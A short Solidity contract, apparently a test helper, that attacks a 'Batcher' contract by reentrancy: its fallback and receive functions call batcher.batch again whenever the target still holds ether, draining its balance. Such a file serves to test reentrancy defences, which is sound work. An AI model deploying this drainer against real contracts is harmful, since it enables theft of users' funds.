pragma solidity ^0.7.0;

import "../Batcher.sol";

contract Reentry {
    Batcher private batcher;
    address[] selfAddress;
    uint256[] selfValue;

    constructor(address payable _batcherAddr) {
        batcher = Batcher(_batcherAddr);
        selfAddress.push(address(this));
        selfValue.push(1);
    }

    fallback() external payable {
        if (address(batcher).balance > 0) {
            batcher.batch(selfAddress, selfValue);
        }
    }

    receive() external payable {
        if (address(batcher).balance > 0) {
            batcher.batch(selfAddress, selfValue);
        }
    }
}
